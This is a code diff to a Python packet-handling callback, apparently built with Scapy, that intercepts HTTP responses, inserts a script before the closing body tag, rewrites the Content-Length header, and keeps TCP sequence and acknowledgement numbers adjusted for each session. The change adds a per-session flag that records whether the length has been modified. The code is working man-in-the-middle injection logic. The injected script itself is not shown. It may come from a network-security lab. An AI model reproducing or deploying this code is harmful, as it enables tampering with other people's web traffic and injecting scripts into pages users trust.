@@ -38,7 +38,7 @@ def callback(pkt):
                 loc = raw.find('</body>')
                 if raw:
                     print('original data size', len(raw))
-                if loc != -1: # didn't consider the case where '</body>' itself is a string, e.g., "var x = '</body>';".
+                if loc != -1 and sessions[S]['modified_length']: # didn't consider the case where '</body>' itself is a string, e.g., "var x = '</body>';".
 
                     # find the enclosing </body>
                     # should insert script before </body>
@@ -70,6 +70,7 @@ def callback(pkt):
                     length = str(int(raw[start:end]) + SCRIPT_LEN)
                     data[TCP].payload = bytes(raw[:start] + length + raw[end:], 'utf-8')
                     modified = True
+                    sessions[S]['modified_length'] = True
 
             if data[TCP].flags & TCP_FIN and S in sessions:
                 sessions[S]['FIN_count'] += 1
@@ -82,7 +83,7 @@ def callback(pkt):
             if S in sessions:
                 print(data.summary(), data.seq - sessions[S]['ack_'], data.ack - sessions[S]['seq_'])
             if data[TCP].flags == TCP_SYN:
-                sessions[S] = {'offset': 0, 'FIN_count': 0, 'threshold': 10**10, 'seq_': 0, 'ack_': 0}
+                sessions[S] = {'offset': 0, 'FIN_count': 0, 'threshold': 10**10, 'seq_': 0, 'ack_': 0, 'modified_length': False}
             if S in sessions:
                 if data[TCP].ack >= sessions[S]['threshold']:
                     data[TCP].ack -= sessions[S]['offset']
